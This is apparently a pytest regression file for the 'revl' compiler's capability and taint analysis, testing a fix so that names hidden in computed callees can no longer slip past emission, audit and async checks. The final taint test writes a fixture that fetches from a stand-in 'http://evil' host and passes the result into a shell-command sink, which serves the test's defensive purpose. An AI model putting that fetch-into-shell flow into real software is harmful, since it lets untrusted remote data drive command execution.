"""A name nested inside a COMPUTED callee is a real reference (G4/G8/A1).

`_calls_in` used to skip the whole `callee` slot of a call. The rule it meant
to encode is narrow: the *directly named* callee of `f(x)` is a call, already
in `found`, and must not be double-counted as a function value escaping. What
it actually did was prune the entire callee SUBTREE, so a name nested inside a
computed callee — `[send][0](x)`, `pick()(x)`, `(b ? send : other)(x)`,
`xs[i](x)` — reached neither the call channel nor the value channel.

`_emitting_capabilities` runs that walk once, top-down, over each module `fn`
body, so such a `fn` never entered the emitting set and the G4 least fixed
point never reached it. Four guarantees fell together:

  * G4 — a plain `provide` method reached an `extern emission fn` and was
    admitted; the host emission fired at run time.
  * G8 — `revl audit` reported `boundary: none — fully revertible` for a
    component that crosses a host boundary.
  * `emission[caps]` — a method scoped to `[db]` reached a boundary outside
    its scope and was admitted.
  * A1 — the async fold lost the coloring, so the emitter produced a sync
    `def` around an unawaited coroutine.

The asymmetry that proved it a bug rather than a design choice: the DIRECT
form inside a provide-method body was caught, because `_method_emissions`
recurses through `node.values()` (the `callee` key included) and re-runs
`_calls_in` from the lower node. The hole was specific to module `fn` bodies,
which is exactly the transitive path the fixed point exists to cover.

`taint.py::_union_children` carried the same shape and was exploitable in its
own right: a sink call nested in a computed callee was never visited, so its
G9 check never ran (`test_taint_sink_nested_in_a_computed_callee_is_checked`).
"""

import importlib.util
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from revl import compile_source  # noqa: E402
from revl.__main__ import _boundary  # noqa: E402
from revl.errors import RevlError  # noqa: E402
from revl.lower import _calls_in, _emitting_capabilities  # noqa: E402


def _emit_py(ir):
    spec = importlib.util.spec_from_file_location(
        "revl_py_emit_callee", ROOT / "backends" / "python" / "emit.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.emit(ir)


def _refuses(src: str, code: str) -> RevlError:
    with pytest.raises(RevlError) as excinfo:
        compile_source(src)
    err = excinfo.value
    assert err.code == code, f"expected {code}, got {err.code}: {err}"
    return err


_SEND = ('extern emission fn send(x: Str) -> Str '
         '= @py { print("HOST EMISSION HAPPENED: " + x); return x }\n')
_OTHER = 'extern pure fn other(x: Str) -> Str = @py { return x }\n'


def _plain_service(dispatch_body: str, extra: str = "",
                   decl: str = "fn calc(a: Str) -> Str") -> str:
    """A module `fn` that dispatches through a computed callee, reached from a
    provide method whose service declaration is `decl`."""
    return (_SEND + extra
            + f"fn dispatch(x: Str) -> Str {{ {dispatch_body} }}\n"
            + f"service S {{ {decl} }}\n"
            + "component C provides s: S { provide s { fn calc(a) = dispatch(a) } }\n")


# --------------------------------------------------------------- the walk
# The distinction the fix draws: VISIT the callee subtree, do not RECORD the
# callee node itself as a flowing value.

def test_a_name_inside_a_computed_callee_reaches_the_value_channel():
    """Before: `called = set()`, `values = {'x'}` — `send` in NEITHER."""
    ir = compile_source(_SEND + "fn dispatch(x: Str) -> Str "
                                "{ return [send][0](x) }\n")
    body = next(f for f in ir["functions"] if f["name"] == "dispatch")["body"]
    called, values = set(), set()
    _calls_in(body, called, values=values)
    assert "send" in values
    # it is a value that flows into an index expression, not a named call
    assert "send" not in called


def test_a_plain_name_callee_is_a_call_and_not_double_counted_as_a_value():
    """The rule the exclusion legitimately encoded, still enforced: `f(x)` puts
    `f` in `found` and must NOT also put it in `values`."""
    ir = compile_source(_SEND + "fn dispatch(x: Str) -> Str "
                                "{ return send(x) }\n")
    body = next(f for f in ir["functions"] if f["name"] == "dispatch")["body"]
    called, values = set(), set()
    _calls_in(body, called, values=values)
    assert called == {"send"}
    assert values == {"x"}          # the argument only — `send` is not a value


def test_a_computed_callee_that_wraps_a_named_call_still_records_the_call():
    """`pick()(x)`: the inner call is a real call (`pick` in `found`), and the
    subtree walk is what reaches it at all."""
    ir = compile_source(
        _SEND
        + "fn pick() -> (Str) -> Str { return send }\n"
        + "fn dispatch(x: Str) -> Str { return pick()(x) }\n")
    body = next(f for f in ir["functions"] if f["name"] == "dispatch")["body"]
    called, values = set(), set()
    _calls_in(body, called, values=values)
    assert "pick" in called
    assert "pick" not in values      # a call target, not an escaping value


# ------------------------------------------------------------------ F1a: G4

def test_g4_refuses_an_index_computed_callee_reaching_an_emission():
    """The executed exploit: ADMITTED before, and the host emission fired."""
    err = _refuses(_plain_service("return [send][0](x)"), "G4")
    assert "declared plain" in err.message
    assert "dispatch()" in err.message


def test_the_direct_form_is_refused_identically_the_asymmetry_is_gone():
    """The control that proved it a bug: the direct callee was always caught.
    Both spellings must now produce the same verdict."""
    _refuses(_SEND
             + "fn dispatch(x: Str) -> Str { return send(x) }\n"
             + "service S { fn calc(a: Str) -> Str }\n"
             + "component C provides s: S "
             + "{ provide s { fn calc(a) = dispatch(a) } }\n", "G4")


def test_the_emitting_fixed_point_reaches_the_dispatching_fn():
    """`dispatch` carries `*` (the dispatch is unnameable) AND `send` (the
    boundary behind it), exactly as the `indirect(ship, x)` shape does."""
    ir = compile_source(_SEND + "fn dispatch(x: Str) -> Str "
                                "{ return [send][0](x) }\n")
    caps = _emitting_capabilities(ir["functions"], ir["externs"])
    assert caps["dispatch"] == {"*", "send"}


# --------------------------------------------- F1b: the idiomatic shapes

def test_g4_refuses_a_factory_returned_handler():
    """`fn pick() -> (Str) -> Int { return send }` then `pick()(x)` — a
    factory-returns-handler pattern, no adversarial intent required."""
    err = _refuses(
        _plain_service("return pick()(x)",
                       extra="fn pick() -> (Str) -> Str { return send }\n"), "G4")
    assert "dispatch()" in err.message


def test_g4_refuses_a_ternary_selected_handler():
    """`(b ? send : other)(x)` — the feature-flagged-handler pattern."""
    _refuses(_SEND + _OTHER
             + "fn dispatch(b: Bool, x: Str) -> Str "
               "{ return (b ? send : other)(x) }\n"
             + "service S { fn calc(a: Str) -> Str }\n"
             + "component C provides s: S "
               "{ provide s { fn calc(a) = dispatch(true, a) } }\n", "G4")


def test_g4_refuses_an_index_selected_handler_table():
    """`xs[i](x)` over a literal handler table."""
    _refuses(_SEND + _OTHER
             + "fn dispatch(i: Int, x: Str) -> Str "
               "{ return [send, other][i](x) }\n"
             + "service S { fn calc(a: Str) -> Str }\n"
             + "component C provides s: S "
               "{ provide s { fn calc(a) = dispatch(0, a) } }\n", "G4")


# ------------------------------------------- F1c: the `emission[caps]` bound

def test_the_capability_bound_is_not_evaded_by_a_computed_callee():
    """A method declared `emission[db]` reaching `send`, a boundary outside
    `[db]`, was ADMITTED. The bound is an upper bound or it is nothing."""
    err = _refuses(_plain_service("return [send][0](x)",
                                  decl="emission[db] fn calc(a: Str) -> Str"),
                   "G4")
    assert "emission[db]" in err.message
    assert "send" in err.message


# ------------------------------------------------------- F1d: A1 coloring

_ASYNC = ('extern emission async fn fetch_it(u: Str) -> Str '
          '= @py { return u }\n')


def test_a1_refuses_an_async_callable_reached_through_a_computed_callee():
    """Before: the emitter produced `def sync_looking(u):` — a sync `def`
    around an unawaited coroutine — so a fn declared `-> Str` returned one
    (`RuntimeWarning: coroutine 'fetch_it' was never awaited`, then
    `TypeError: object of type 'coroutine' has no len()`).

    The async fold deliberately has no `*` widening: an arrow type carries no
    color, so a first-class async reference is REFUSED at its use site rather
    than folded in (docs/design/async-extern.md §3, "First-class values are
    refused, not widened"). Making the reference visible is what lets that
    existing refusal fire; coloring `sync_looking` async instead would claim an
    `await` the emitter cannot place through an arrow type."""
    err = _refuses(_ASYNC + "fn sync_looking(u: Str) -> Str "
                            "{ return [fetch_it][0](u) }\n", "A1")
    assert "uses async callable `fetch_it` as a function value" in err.message


def test_a_directly_called_async_extern_still_colors_and_is_awaited():
    """The false-positive control on the same fold: the nameable form is
    colored `async def` and awaited, unchanged."""
    ir = compile_source(_ASYNC + "fn sync_looking(u: Str) -> Str "
                                 "{ return fetch_it(u) }\n")
    out = _emit_py(ir)
    assert "async def sync_looking(u):" in out
    assert "return (await fetch_it(u))" in out
    # the shape the hole produced is gone: no sync def wrapping a coroutine
    assert "def sync_looking(u):\n" not in out.replace("async def", "@@")
    compile(out, "<emitted>", "exec")


# --------------------------------------------------------- F1a/G8: the audit

_G8_ADMITTED = (_SEND
                + "fn dispatch(x: Str) -> Str { return [send][0](x) }\n"
                + "service S { emission fn calc(a: Str) -> Str }\n"
                + "component C provides s: S "
                  "{ provide s { fn calc(a) = dispatch(a) } }\n")


def test_the_g8_audit_reports_the_boundary_behind_a_computed_callee():
    """Declared `emission`, so the program is admitted — and the audit surface
    must then say WHICH boundary it reaches. Before, `_boundary` returned no
    externs at all and `revl audit` printed
    `boundary: none — fully revertible (G8)` for a component reaching an
    `extern emission fn`."""
    externs = _boundary(compile_source(_G8_ADMITTED))["C"]["externs"]
    by_name = {e["name"]: e["class"] for e in externs}
    assert by_name == {"*": "first-class dispatch", "send": "emission"}


# ------------------------------------------------------- false positives

def test_an_ordinary_direct_call_chain_stays_pure():
    """A genuinely pure helper reached by a plain provide method is still
    admitted, and earns no entry in the fixed point."""
    ir = compile_source(
        "extern pure fn purefn(x: Str) -> Str = @py { return x }\n"
        "fn chain(x: Str) -> Str { return purefn(x) }\n"
        "service S { fn calc(a: Str) -> Str }\n"
        "component C provides s: S { provide s { fn calc(a) = chain(a) } }\n")
    assert _emitting_capabilities(ir["functions"], ir["externs"]) == {}
    # the pure extern is enumerated as `pure`; no crossing, no `*` dispatch
    assert [(e["name"], e["class"]) for e in _boundary(ir)["C"]["externs"]] \
        == [("purefn", "pure")]


def test_a_computed_callee_over_pure_callables_stays_pure():
    """The widening is about what the dispatched value REACHES, not about the
    dispatch. A handler table of pure functions crosses no boundary."""
    ir = compile_source(
        "extern pure fn purefn(x: Str) -> Str = @py { return x }\n"
        "fn dispatch(x: Str) -> Str { return [purefn][0](x) }\n"
        "service S { fn calc(a: Str) -> Str }\n"
        "component C provides s: S { provide s { fn calc(a) = dispatch(a) } }\n")
    assert _emitting_capabilities(ir["functions"], ir["externs"]) == {}


def test_a_dispatcher_over_its_own_parameter_stays_clean():
    """The pre-existing invariant: `indirect` dispatches through its OWN
    parameter, so nothing concrete flows there. Only `wrap`, which hands it an
    emitting value, is flagged."""
    ir = compile_source(
        _SEND
        + "fn indirect(f: (Str) -> Str, x: Str) -> Str { return f(x) }\n"
        + "fn wrap(x: Str) -> Str { return indirect(send, x) }\n")
    caps = _emitting_capabilities(ir["functions"], ir["externs"])
    assert caps["wrap"] == {"*", "send"}
    assert "indirect" not in caps


# ------------------------------------------------ taint: the same shape

def test_taint_sink_nested_in_a_computed_callee_is_checked():
    """`taint.py::_union_children` skipped the whole `callee` slot too. That
    was NOT merely latent: the union fallback keeps taint from disappearing
    only across slots it actually visits, and an unvisited subtree is never
    walked for sinks either. A G9 shell sink nested in a computed callee was
    admitted; the byte-identical flow in argument position was refused."""
    prelude = (
        "extern emission[web] fn fetch(u: Str) -> Untrusted[Str] "
        "= @py { return u }\n"
        "extern emission[shell] fn run(cmd: Trusted[Str]) -> Int "
        "= @py { return 0 }\n"
        "extern pure fn len_of(s: Str) -> Int = @py { return len(s) }\n"
        "fn ident(n: Int) -> (Str) -> Int { return len_of }\n")
    tail = ("service Ops { emission fn go(u: Str) -> Int }\n"
            "component A provides ops: Ops "
            "{ provide ops { fn go(u) = f(u) } }\n")
    nested = (prelude
              + 'fn f(s: Str) -> Int { return ident(run(fetch("http://evil")))(s) }\n'
              + tail)
    direct = (prelude
              + 'fn f(s: Str) -> Int '
                '{ return len_of(s) + run(fetch("http://evil")) }\n'
              + tail)
    for src in (nested, direct):
        err = _refuses(src, "G9")
        assert "shell command" in err.message
